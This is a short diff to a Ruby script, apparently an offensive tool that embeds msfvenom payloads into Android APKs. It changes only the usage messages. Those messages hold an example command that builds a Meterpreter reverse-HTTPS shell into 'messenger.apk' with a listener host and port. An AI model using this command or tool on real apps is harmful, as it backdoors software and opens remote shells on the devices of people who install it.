@@ -144,8 +144,8 @@ end
 
 apkfile = ARGV[0]
 unless(apkfile && File.readable?(apkfile))
-  puts "[Usage]─➤ #{$0} [target.apk] [msfvenom options]\n".cyan
-  puts "[ex]─➤ #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
+  puts "[Usage]─➤ ruby EMBED.rb [target.apk] [msfvenom options]\n".cyan
+  puts "[ex]─➤ ruby EMBED.rb messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
   exit(1)
 end
 
@@ -181,8 +181,10 @@ begin
 	opts+=" "
 	}
 rescue
-  puts "[Usage]─➤ #{$0} [target.apk] [msfvenom options]\n".cyan
-  puts "[ex]─➤ #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
+  puts "[Usage]─➤ ruby EMBED.rb [target.apk] [msfvenom options]\n".cyan
+# #{$0} [target.apk] [msfvenom options]\n".cyan
+  puts "[ex]─➤ ruby EMBED.rb messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
+# #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
   puts "[ERR-msf]─➤ Error parsing msfvenom options. Exiting.\n".red
 	exit(1)
 end
